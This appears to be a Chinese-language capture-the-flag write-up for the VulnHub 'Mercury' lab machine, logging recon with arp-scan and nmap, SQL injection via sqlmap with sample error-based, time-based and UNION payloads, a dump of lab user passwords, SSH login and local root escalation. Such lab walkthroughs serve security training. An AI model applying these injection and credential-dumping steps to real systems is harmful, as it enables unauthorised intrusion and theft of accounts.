---
title: Mercury CTF 笔记
date: 2025‑04‑21 12:09:04 +08:00
tags: [vulnhub, CTF练习, Mercury]
---

## 靶机信息

- **目标类型**：基础练习  
- **目标名称**：Mercury  
- **获取方式**：从 <https://www.vulnhub.com> 下载

---

## 过程

> 按时间顺序记录每一步的 **手段（Method）**、**发现（Finding）** 及 **结论 / 推测（Note）**。

### Step 1 — 发现目标 IP
- **Method**：`arp-scan`
  ```bash
  sudo arp-scan --interface=vboxnet0 192.168.56.0/24
  ```
- **Finding**：目标地址 `192.168.56.101`
- **Note**：确认虚拟机在线

### Step 2 — 端口扫描
- **Method**：`nmap`
  ```bash
  sudo nmap 192.168.56.101
  ```
- **Finding**：开放 `22/tcp`、`8080/tcp`
- **Note**：22 可能为 SSH，8080 为 Web 服务

### Step 3 — 首次浏览器访问
- **Method**：浏览器打开 <http://192.168.56.101:8080>
- **Finding**：页面仅一行文字
- **Note**：继续深挖

### Step 4 — ZAP 扫描与站点发现
- **Method**：OWASP ZAP
- **Finding**：
  - 站点基于 *Python + Django*，由 *uWSGI* 托管，且运行在 **DEBUG** 模式  
  - 发现 `sitemap.xml`，定位真实路径 <http://192.168.56.101:8080/mercuryfacts/>  
  - 发现直接数据库调用示例 <http://192.168.56.101:8080/mercuryfacts/1>

### Step 5 — TODO 页面信息泄露
- **Method**：访问 `/mercuryfacts/todo`
- **Finding**：  
  1. 目前未使用用户表认证  
  2. 数据库操作未走 Django ORM，而是直接 SQL

### Step 6 — SQL 注入检测
- **Method**：`sqlmap`
  ```bash
  sqlmap -u "http://192.168.56.101:8080/mercuryfacts/" --dbs
  ```
- **Finding**：确认三种注入方式  
  1. **报错注入**  
     ```
     .../GTID_SUBSET(CONCAT(0x7162787a71,(SELECT (ELT(5587=5587,1))),0x7171767a71),5587)
     ```  
  2. **时间盲注**  
     ```
     .../(CASE WHEN (4872=4872) THEN SLEEP(5) ELSE 4872 END)
     ```  
  3. **UNION 注入**  
     ```
     .../-9645 UNION ALL SELECT CONCAT(...)
     ```  
  获取数据库：`information_schema`, `mercury`

### Step 7 — 获取站点路径
- **Method**：利用报错注入
- **Finding**：Django 项目路径 `/home/webmaster/mercury_proj`

### Step 8 — 数据库权限枚举
- **Method**：
  ```bash
  sqlmap -u "http://192.168.56.101:8080/mercuryfacts/" --privileges
  ```
- **Finding**：用户 `dbmaster` 权限仅 `USAGE`

### Step 9 — 枚举数据表
- **Method**：
  ```bash
  sqlmap -u "http://192.168.56.101:8080/mercuryfacts/" -D mercury --tables
  ```
- **Finding**：表 `facts`、`users`

### Step 10 — Dump 用户表
- **Method**：
  ```bash
  sqlmap -u "http://192.168.56.101:8080/mercuryfacts/" -D mercury -T users -C username,password --dump
  ```
- **Finding**：明文账户
  | username  | password                      |
  |-----------|------------------------------|
  | john      | johnny1987                   |
  | laura     | lovemykids111                |
  | sam       | lovemybeer111                |
  | webmaster | mercuryisthesizeof0.056Earths |
- **Note**：尝试 SSH 登录

### Step 11 — 获取 user flag
- **Method**：SSH 登录
  ```bash
  ssh webmaster@192.168.56.101
  ```
- **Finding**：`webmaster` 登录成功  
  `user_flag_8339915c9a454657bd60ee58776f4ccd`

### Step 12 — 本地提权
- **Method**：上传 `linux-exploit-suggester`，选择可行漏洞
- **Finding**：成功获得 **root shell**

---

## 最终结果

- 获得 **root** 权限  
- 成功读取 Flag

![Flag](images/Mercury/flag.png)
